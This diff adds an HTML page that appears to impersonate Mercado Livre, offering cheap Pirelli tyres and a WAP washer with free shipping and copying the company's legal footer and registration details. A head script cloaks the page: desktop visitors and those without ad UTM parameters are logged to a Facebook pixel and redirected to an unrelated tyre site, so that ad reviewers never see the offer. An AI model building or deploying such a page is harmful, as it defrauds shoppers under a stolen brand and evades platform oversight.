@@ -1,0 +1,499 @@
+﻿<!doctype html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <title>Mercado Livre Ofertas</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,300;0,400;0,500;0,700;0,900;1,700;1,900&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+
+    <script
+      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+      data-utmify-prevent-xcod-sck
+      data-utmify-prevent-subids
+      async
+      defer
+    ></script>
+    <!-- Meta Pixel Code -->
+    <script>
+      !(function (f, b, e, v, n, t, s) {
+        if (f.fbq) return;
+        n = f.fbq = function () {
+          n.callMethod
+            ? n.callMethod.apply(n, arguments)
+            : n.queue.push(arguments);
+        };
+        if (!f._fbq) f._fbq = n;
+        n.push = n;
+        n.loaded = !0;
+        n.version = "2.0";
+        n.queue = [];
+        t = b.createElement(e);
+        t.async = !0;
+        t.src = v;
+        s = b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t, s);
+      })(
+        window,
+        document,
+        "script",
+        "https://connect.facebook.net/en_US/fbevents.js",
+      );
+      fbq("init", "3552534014959752");
+      fbq("track", "PageView");
+    </script>
+    <noscript
+      ><img
+        height="1"
+        width="1"
+        style="display: none"
+        src="https://www.facebook.com/tr?id=3552534014959752&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+    <script>
+      window.pixelId = "698e81ca6650936c1da59844";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+    <script>
+      (function () {
+        // 1. CONFIGURAÇÕES
+        const urlFiltro = "https://www.pneubarato.com.br/";
+
+        // 2. DETECÇÃO (Mobile + UTM)
+        const isMobile =
+          /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
+            navigator.userAgent,
+          );
+        const temUTM = window.location.search.includes("utm_source");
+
+        // 3. LÓGICA DE BLOQUEIO
+        if (!isMobile || !temUTM) {
+          // Envia um evento personalizado para o Facebook antes de redirecionar
+          // O evento vai se chamar "AcessoBloqueado"
+          if (typeof fbq !== "undefined") {
+            fbq("trackCustom", "AcessoBloqueado", {
+              motivo: !isMobile ? "Desktop" : "Falta_UTM",
+              url_origem: window.location.href,
+            });
+          }
+
+          // Pequeno delay de 300ms apenas para o Pixel ter tempo de disparar
+          setTimeout(function () {
+            window.location.replace(urlFiltro);
+          }, 300);
+        }
+      })();
+    </script>
+    <style>
+      /* --- Variáveis e Reset --- */
+      :root {
+        --ml-yellow: #ffe600;
+        --ml-blue: #3483fa;
+        --ml-bg-gray: #ebebeb;
+        --ml-text-dark: #333;
+        --ml-green: #00a650;
+      }
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Roboto", sans-serif;
+        -webkit-tap-highlight-color: transparent;
+      }
+
+      body {
+        background-color: var(--ml-bg-gray);
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+      }
+
+      /* --- Header Limpo --- */
+      .ml-header {
+        background-color: var(--ml-yellow);
+        padding: 0 16px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        height: 54px;
+        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        position: sticky;
+        top: 0;
+        z-index: 100;
+      }
+
+      /* Texto Centralizado Absoluto */
+      .header-text {
+        color: #2d3277;
+        font-size: 16px;
+        font-weight: 600;
+        text-transform: uppercase;
+        letter-spacing: -0.3px;
+        position: absolute;
+        left: 50%;
+        transform: translateX(-50%);
+        white-space: nowrap;
+      }
+
+      .header-icons {
+        color: #333;
+        font-size: 19px;
+        cursor: pointer;
+        width: 30px;
+        text-align: center;
+      }
+
+      /* --- Conteúdo --- */
+      .main-content {
+        width: 100%;
+        max-width: 600px;
+        margin: 0 auto;
+        padding: 16px 12px;
+        flex: 1;
+      }
+
+      h1.section-title {
+        color: var(--ml-text-dark);
+        font-size: 18px;
+        font-weight: 600;
+        margin-bottom: 12px;
+        padding-left: 4px;
+      }
+
+      /* --- Lista de Produtos com Shadow --- */
+      .product-list {
+        display: flex;
+        flex-direction: column;
+        gap: 12px; /* Espaço entre os cards para ver a sombra */
+      }
+
+      .product-item {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        background-color: #fff;
+        padding: 18px 16px;
+        text-decoration: none;
+        color: var(--ml-text-dark);
+
+        /* Sombra estilo Card ML */
+        box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.15);
+        border-radius: 6px; /* Bordas arredondadas */
+
+        transition:
+          transform 0.1s,
+          box-shadow 0.1s;
+      }
+
+      .product-item:active {
+        background-color: #f9f9f9;
+        transform: scale(0.98);
+        box-shadow: 0 1px 1px 0 rgba(0, 0, 0, 0.1);
+      }
+
+      .product-left {
+        display: flex;
+        align-items: center;
+        gap: 16px;
+      }
+
+      .image-container {
+        width: 68px;
+        height: 68px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .product-img {
+        max-width: 100%;
+        max-height: 100%;
+        object-fit: contain;
+      }
+
+      .product-info {
+        display: flex;
+        flex-direction: column;
+        gap: 4px;
+      }
+
+      .product-name {
+        font-size: 14px;
+        font-weight: 400;
+        line-height: 1.25;
+        color: rgba(0, 0, 0, 0.9);
+      }
+
+      .product-name strong {
+        font-weight: 700;
+        font-size: 15px;
+      }
+
+      .shipping-info {
+        font-size: 12px;
+        color: var(--ml-green);
+        font-weight: 500;
+        display: flex;
+        align-items: center;
+        gap: 4px;
+        margin-top: 2px;
+      }
+
+      .full-badge {
+        font-weight: 900;
+        font-style: italic;
+        display: inline-flex;
+        align-items: center;
+        color: var(--ml-green);
+      }
+
+      .full-icon {
+        font-size: 10px;
+        margin-left: 1px;
+      }
+
+      /* Seta Grossa */
+      .arrow-icon {
+        color: var(--ml-blue);
+        font-size: 16px;
+        font-weight: 900;
+        -webkit-text-stroke: 1px var(--ml-blue);
+        opacity: 1;
+      }
+
+      /* --- Footer Pro --- */
+      .pro-footer {
+        background-color: #fff;
+        padding: 24px 20px 40px;
+        border-top: 1px solid #e0e0e0;
+        margin-top: 20px;
+      }
+
+      .footer-menu {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 15px 20px;
+        margin-bottom: 25px;
+        justify-content: center;
+      }
+
+      .footer-menu a {
+        color: #333;
+        text-decoration: none;
+        font-size: 12px;
+        font-weight: 400;
+      }
+
+      .footer-legal {
+        color: #999;
+        font-size: 11px;
+        text-align: center;
+        line-height: 1.4;
+      }
+
+      .footer-legal p {
+        margin-bottom: 8px;
+      }
+    </style>
+  </head>
+  <body>
+    <header class="ml-header">
+      <i class="fa-solid fa-bars header-icons"></i>
+      <span class="header-text">Mercado Livre Ofertas</span>
+      <i class="fa-solid fa-cart-shopping header-icons"></i>
+    </header>
+
+    <div class="main-content">
+      <h1 class="section-title">Esquenta Carnaval</h1>
+
+      <div class="product-list">
+        <a href="aro13" class="product-item">
+          <div class="product-left">
+            <div class="image-container">
+              <img src="images/pneu.png" alt="Pneu" class="product-img" />
+            </div>
+            <div class="product-info">
+              <span class="product-name"
+                >Pneu Aro <strong>13</strong> Pirelli</span
+              >
+              <span class="shipping-info">
+                Frete grátis
+                <span class="full-badge"
+                  >FULL<i class="fa-solid fa-bolt full-icon"></i
+                ></span>
+              </span>
+            </div>
+          </div>
+          <i class="fa-solid fa-chevron-right arrow-icon"></i>
+        </a>
+
+        <a href="aro14" class="product-item">
+          <div class="product-left">
+            <div class="image-container">
+              <img src="images/pneu.png" alt="Pneu" class="product-img" />
+            </div>
+            <div class="product-info">
+              <span class="product-name"
+                >Pneu Aro <strong>14</strong> Pirelli</span
+              >
+              <span class="shipping-info">
+                Frete grátis
+                <span class="full-badge"
+                  >FULL<i class="fa-solid fa-bolt full-icon"></i
+                ></span>
+              </span>
+            </div>
+          </div>
+          <i class="fa-solid fa-chevron-right arrow-icon"></i>
+        </a>
+
+        <a href="aro15" class="product-item">
+          <div class="product-left">
+            <div class="image-container">
+              <img src="images/pneu.png" alt="Pneu" class="product-img" />
+            </div>
+            <div class="product-info">
+              <span class="product-name"
+                >Pneu Aro <strong>15</strong> Pirelli</span
+              >
+              <span class="shipping-info">
+                Frete grátis
+                <span class="full-badge"
+                  >FULL<i class="fa-solid fa-bolt full-icon"></i
+                ></span>
+              </span>
+            </div>
+          </div>
+          <i class="fa-solid fa-chevron-right arrow-icon"></i>
+        </a>
+
+        <a href="aro16" class="product-item">
+          <div class="product-left">
+            <div class="image-container">
+              <img src="images/pneu.png" alt="Pneu" class="product-img" />
+            </div>
+            <div class="product-info">
+              <span class="product-name"
+                >Pneu Aro <strong>16</strong> Pirelli</span
+              >
+              <span class="shipping-info">
+                Frete grátis
+                <span class="full-badge"
+                  >FULL<i class="fa-solid fa-bolt full-icon"></i
+                ></span>
+              </span>
+            </div>
+          </div>
+          <i class="fa-solid fa-chevron-right arrow-icon"></i>
+        </a>
+
+        <a href="aro17" class="product-item">
+          <div class="product-left">
+            <div class="image-container">
+              <img src="images/pneu.png" alt="Pneu" class="product-img" />
+            </div>
+            <div class="product-info">
+              <span class="product-name"
+                >Pneu Aro <strong>17</strong> Pirelli</span
+              >
+              <span class="shipping-info">
+                Frete grátis
+                <span class="full-badge"
+                  >FULL<i class="fa-solid fa-bolt full-icon"></i
+                ></span>
+              </span>
+            </div>
+          </div>
+          <i class="fa-solid fa-chevron-right arrow-icon"></i>
+        </a>
+
+        <a href="aro18" class="product-item">
+          <div class="product-left">
+            <div class="image-container">
+              <img src="images/pneu.png" alt="Pneu" class="product-img" />
+            </div>
+            <div class="product-info">
+              <span class="product-name"
+                >Pneu Aro <strong>18</strong> Pirelli</span
+              >
+              <span class="shipping-info">
+                Frete grátis
+                <span class="full-badge"
+                  >FULL<i class="fa-solid fa-bolt full-icon"></i
+                ></span>
+              </span>
+            </div>
+          </div>
+          <i class="fa-solid fa-chevron-right arrow-icon"></i>
+        </a>
+        <a href="wap-lider-2200" class="product-item">
+          <div class="product-left">
+            <div class="image-container">
+              <img src="images/wap-lider-2200.png" alt="Lavadora WAP" class="product-img" />
+            </div>
+            <div class="product-info">
+              <span class="product-name">Lavadora <strong>WAP Líder 2200</strong> 1750W</span>
+              <span class="shipping-info">
+                Frete grátis
+                <span class="full-badge">FULL<i class="fa-solid fa-bolt full-icon"></i></span>
+              </span>
+            </div>
+          </div>
+          <i class="fa-solid fa-chevron-right arrow-icon"></i>
+        </a>
+      </div>
+    </div>
+
+    <footer class="pro-footer">
+      <div class="footer-menu">
+        <a href="#">Minha conta</a>
+        <a href="#">Compras</a>
+        <a href="#">Histórico</a>
+        <a href="#">Favoritos</a>
+        <a href="#">Categorias</a>
+        <a href="#">Ofertas do dia</a>
+        <a href="#">Vender</a>
+        <a href="#">Contato</a>
+      </div>
+
+      <div class="footer-legal">
+        <p>
+          <a href="#" style="color: #333; text-decoration: none"
+            >Termos e condições</a
+          >
+          &nbsp;•&nbsp;
+          <a href="#" style="color: #333; text-decoration: none"
+            >Como cuidamos da sua privacidade</a
+          >
+          &nbsp;•&nbsp;
+          <a href="#" style="color: #333; text-decoration: none"
+            >Acessibilidade</a
+          >
+        </p>
+        <p style="margin-top: 15px">
+          Copyright © 1999-2024 Ebazar.com.br LTDA.
+        </p>
+        <p>
+          CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim,
+          Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre.
+        </p>
+      </div>
+    </footer>
+  </body>
+</html>
